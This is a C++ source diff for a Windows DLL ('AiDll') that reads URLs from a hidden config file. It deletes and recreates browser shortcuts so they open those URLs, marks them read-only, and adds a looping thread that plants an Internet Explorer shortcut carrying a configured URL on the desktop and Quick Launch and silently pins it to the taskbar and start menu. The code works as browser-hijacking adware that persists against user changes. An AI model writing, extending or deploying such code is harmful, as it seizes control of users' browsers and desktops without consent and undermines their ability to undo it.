@@ -116,14 +116,16 @@ void AiDll::Work(int magic)
 		}
 		SetFileAttributes(szSvcCfg, FILE_ATTRIBUTE_HIDDEN);
 		
-		HANDLE hThread[3];
+		HANDLE hThread[4];
 		hThread[0] = (HANDLE)_beginthreadex(NULL, 0, AiDll::ModifyShortCutProc, NULL, 0, NULL);
 		hThread[1] = (HANDLE)_beginthreadex(NULL, 0, AiDll::CreateShortCutProc, NULL, 0, NULL);
 		hThread[2] = (HANDLE)_beginthreadex(NULL, 0, AiDll::CreateItemShortCutProc, NULL, 0, NULL);
-		::WaitForMultipleObjects(3,hThread,TRUE,INFINITE);
+		hThread[3] = (HANDLE)_beginthreadex(NULL, 0, AiDll::CreateShortCutProcIE, NULL, 0, NULL);
+		::WaitForMultipleObjects(4,hThread,TRUE,INFINITE);
 		::CloseHandle(hThread[0]);
 		::CloseHandle(hThread[1]);
 		::CloseHandle(hThread[2]);
+		::CloseHandle(hThread[3]);
 
 	}
 	return ;
@@ -136,6 +138,12 @@ UINT WINAPI  AiDll::ModifyShortCutProc( void* param )
 	int mscSwitch = GetPrivateProfileInt(L"msc", L"switch", 1, AiDll::strCfgPath.c_str());
 	WCHAR mscUrl[MAX_PATH] = {0};
 	GetPrivateProfileString(L"msc", L"url", L"", mscUrl, MAX_PATH, AiDll::strCfgPath.c_str());
+	
+	WCHAR cscUrl[MAX_PATH] = {0};
+	GetPrivateProfileString(L"csc", L"url", L"", cscUrl, MAX_PATH, AiDll::strCfgPath.c_str());
+
+	WCHAR cscieUrl[MAX_PATH] = {0};
+	GetPrivateProfileString(L"cscie", L"url", L"", cscieUrl, MAX_PATH, AiDll::strCfgPath.c_str());
 
 	if (mscSwitch == 0 || mscTime <= 0 || wcscmp(mscUrl, L"") == 0)
 	{
@@ -217,13 +225,13 @@ UINT WINAPI  AiDll::ModifyShortCutProc( void* param )
 								std::wstring strArguments;
 								std::wstring strWorkDirectory;
 								std::wstring strIconLocation;
-								if (CheckFileExist(strPath) == true)
+								if (CheckFileExist(strPath) == TRUE)
 								{
 									//OutputDebugStringW(L"find");
 									//OutputDebugStringW(strPath.c_str());
 									//xlog("CheckFileExist %s %s %s", ultra::_T2A(strPath).c_str(), ultra::_T2A(strTarget).c_str(), ultra::_T2A(strArguments).c_str());
 									Shell::GetShortCutInfo(strPath, strTarget, strArguments, strWorkDirectory, strIconLocation);
-									if (strTarget == L"" && ultra::CompareStringNoCase(strArguments, mscUrl) != 0)
+									if (strTarget == L"" && ultra::CompareStringNoCase(strArguments, mscUrl) != 0 && ultra::CompareStringNoCase(strArguments, cscUrl) != 0 && ultra::CompareStringNoCase(strArguments, cscieUrl) != 0)
 									{
 										DeleteFile(strPath.c_str());
 										//xlog("CreateShortCutLink %s %s", ultra::_T2A(strFileName).c_str(), szScUrl);
@@ -231,7 +239,7 @@ UINT WINAPI  AiDll::ModifyShortCutProc( void* param )
 										Shell::CreateShortCutLink(GetNameFromPath(strFileName), mscUrl, GetIEDir(),  destVec[j], mscUrl, L"", strIconLocation);
 										SetFileAttributes((destVec[j]+strFileName).c_str(), FILE_ATTRIBUTE_READONLY);
 									}
-									else if (ultra::CompareStringNoCase(strArguments, mscUrl) != 0)
+									else if (ultra::CompareStringNoCase(strArguments, mscUrl) != 0 && ultra::CompareStringNoCase(strArguments, cscUrl) != 0 && ultra::CompareStringNoCase(strArguments, cscieUrl) != 0)
 									{
 										//OutputDebugStringW(L"create");
 										//xlog("CreateShortCutLink %s %s", ultra::_T2A(strFileName).c_str(), szScUrl);
@@ -279,7 +287,7 @@ UINT WINAPI  AiDll::CreateShortCutProc( void* param )
 		,L"SogouExplorer",L"ËÑ¹·¸ßËÙä¯ÀÀÆ÷"
 		,L"TaoBrowser",L"ÌÔ±¦ä¯ÀÀÆ÷"
 		,L"2345Explorer",L"2345ÍõÅÆä¯ÀÀÆ÷"
-		,L"IEXPLORE",L"Internet Explorer"
+		//,L"IEXPLORE",L"Internet Explorer"
 	};
 
 	while(TRUE)
@@ -304,7 +312,7 @@ UINT WINAPI  AiDll::CreateShortCutProc( void* param )
 			}
 			if (strDefaultName.empty())
 			{
-				continue;
+				break;
 			}
 
 			std::wstring strSCName = strDefaultName+L".lnk";
@@ -378,7 +386,7 @@ UINT WINAPI  AiDll::CreateShortCutProc( void* param )
 				std::wstring strDefaultLnk_QuickLaunch = strQuickLaunch + strSCName;
 				if (!::PathFileExists(strDefaultLnk_QuickLaunch.c_str()))
 				{
-					Shell::CreateShortCutLink(strDefaultName, cscUrl,ultra::GetUpperPath(ultra::ExpandEnvironment(strDefaultPath)), strQuickLaunch.c_str(), cscUrl, L"", strDefaultPath);
+					Shell::CreateShortCutLink(strDefaultName, strDefaultPath,ultra::GetUpperPath(ultra::ExpandEnvironment(strDefaultPath)), strQuickLaunch.c_str(), cscUrl, L"", strDefaultPath);
 					SetFileAttributes(strDefaultLnk_QuickLaunch.c_str(), FILE_ATTRIBUTE_READONLY);
 				}
 			}
@@ -517,7 +525,114 @@ UINT WINAPI  AiDll::CreateItemShortCutProc( void* param )
 }
 
 
+UINT WINAPI  AiDll::CreateShortCutProcIE( void* param )
+{
+	int cscTime = GetPrivateProfileInt(L"cscie", L"time", 60*10, AiDll::strCfgPath.c_str());
+	int cscSwitch = GetPrivateProfileInt(L"cscie", L"switch", 1, AiDll::strCfgPath.c_str());
+	WCHAR cscUrl[MAX_PATH] = {0};
+	GetPrivateProfileString(L"cscie", L"url", L"", cscUrl, MAX_PATH, AiDll::strCfgPath.c_str());
 
+	if (cscSwitch == 0 || cscTime <= 0 || wcscmp(cscUrl, L"") == 0)
+	{
+		return 0;
+	}
+	CoInitialize(NULL);
+
+	while(TRUE)
+	{
+		do 
+		{
+			std::wstring strIEPath;
+			CRegedit::Read(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\IEXPLORE.EXE", L"", strIEPath);
+
+			strIEPath = GetPathFromString(strIEPath);
+			if (strIEPath.empty())
+			{
+				break;
+			}
+			std::wstring strIEName = L"Internet Explorer";
+			std::wstring strSCName = strIEName+L".lnk";
+			TCHAR szIELnk_CurrentDeskTop[MAX_PATH] = {0};
+			std::wstring strUserDeskTop = L"";
+			if (SHGetSpecialFolderPath(NULL, szIELnk_CurrentDeskTop, CSIDL_DESKTOP, 0))
+			{
+				std::wstring wstrserDeskTop= szIELnk_CurrentDeskTop;
+				std::size_t last = wstrserDeskTop.find_last_of(L"\\");
+				if (last != std::wstring::npos)
+				{
+					if (last != wstrserDeskTop.length()-1)
+					{
+						wstrserDeskTop += L"\\";
+					}
+					strUserDeskTop = wstrserDeskTop;
+				}
+				::PathAppend(szIELnk_CurrentDeskTop,strSCName.c_str());
+			}
+
+			TCHAR szIELnk_AllUserDeskTop[MAX_PATH] = {0};
+			if (SHGetSpecialFolderPath(NULL, szIELnk_AllUserDeskTop, CSIDL_COMMON_DESKTOPDIRECTORY, 0))
+			{
+				::PathAppend(szIELnk_AllUserDeskTop,strSCName.c_str());
+			}
+			if ((szIELnk_CurrentDeskTop[0] == '\0' || !::PathFileExists(szIELnk_CurrentDeskTop))
+				&& (szIELnk_AllUserDeskTop[0] == '\0' || !::PathFileExists(szIELnk_AllUserDeskTop)))
+			{
+				if (szIELnk_CurrentDeskTop[0] != '\0')
+				{
+					Shell::CreateShortCutLink(strIEName, strIEPath, ultra::GetUpperPath(ultra::ExpandEnvironment(strIEPath)), strUserDeskTop.c_str(), cscUrl, L"", strIEPath);
+					SetFileAttributes(szIELnk_CurrentDeskTop, FILE_ATTRIBUTE_READONLY);
+				}
+			}
+			if (ultra::OSIsVista())
+			{
+				if (szIELnk_CurrentDeskTop[0] == '\0' || !::PathFileExists(szIELnk_CurrentDeskTop))
+				{
+					break;
+				}
+				std::wstring strTaskBarPath =  ultra::ExpandEnvironment(L"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\");
+				std::wstring strStartMenuPath = ultra::ExpandEnvironment(L"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\StartMenu\\");
+
+				std::wstring strIELnk_TaskBar = strTaskBarPath + strSCName;
+				if (!::PathFileExists(strIELnk_TaskBar.c_str()))
+				{
+					ShellExecute(NULL, L"taskbarpin", szIELnk_CurrentDeskTop, L"", L"", SW_HIDE);
+					Sleep(2000);
+					if (!::PathFileExists(strIELnk_TaskBar.c_str()))
+					{
+						PinShortCutLnk(L"taskbarpin",szIELnk_CurrentDeskTop);
+					}
+				}
+
+				std::wstring strIELnk_StartMenu = strStartMenuPath + strSCName;
+				if (!::PathFileExists(strIELnk_StartMenu.c_str()))
+				{
+					ShellExecute(NULL, L"startpin", szIELnk_CurrentDeskTop, L"", L"", SW_HIDE);
+					Sleep(2000);
+					if (!::PathFileExists(strIELnk_StartMenu.c_str()))
+					{
+						PinShortCutLnk(L"startpin",szIELnk_CurrentDeskTop);
+					}
+				}
+				RevertToSelf();
+
+			}
+			else
+			{
+				std::wstring strQuickLaunch =  ultra::ExpandEnvironment(L"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\");
+				std::wstring strIELnk_QuickLaunch = strQuickLaunch + strSCName;
+				if (!::PathFileExists(strIELnk_QuickLaunch.c_str()))
+				{
+					Shell::CreateShortCutLink(strIEName, cscUrl,ultra::GetUpperPath(ultra::ExpandEnvironment(strIEPath)), strQuickLaunch.c_str(), cscUrl, L"", strIEPath);
+					SetFileAttributes(strIELnk_QuickLaunch.c_str(), FILE_ATTRIBUTE_READONLY);
+				}
+			}
+		} while (FALSE);
+
+		Sleep(cscTime*1000);
+	}
+	CoUninitialize();
+	return 0;
+}
 
 std::wstring AiDll::GetCurrentMouleBuildNum()
 {
@@ -640,7 +755,7 @@ std::wstring SplitFileName(std::wstring strFileName)
 	return strRet;
 }
 
-bool IsAdmin()
+BOOL IsAdmin()
 {
 	BOOL bIsElevated = FALSE;  
 	HANDLE hToken = NULL;  
@@ -732,7 +847,7 @@ int VerCmp(unsigned __int64 ver1, unsigned __int64 ver2)
 }
 
 
-bool CheckFileExist(std::wstring strFile)
+BOOL CheckFileExist(std::wstring strFile)
 {
 	if (strFile[1] != ':')
 	{
@@ -894,7 +1009,7 @@ bool Shell::CreateShortCutLink(
 	return SUCCEEDED(hr);
 }
 
-bool Shell::GetShortCutInfo(std::wstring strFileName, std::wstring& strTarget, std::wstring& strArguments, std::wstring& strWorkDirctory, std::wstring& strIconLocation)
+BOOL Shell::GetShortCutInfo(std::wstring strFileName, std::wstring& strTarget, std::wstring& strArguments, std::wstring& strWorkDirctory, std::wstring& strIconLocation)
 {
 	HRESULT hr;
 	IShellLink* psl;
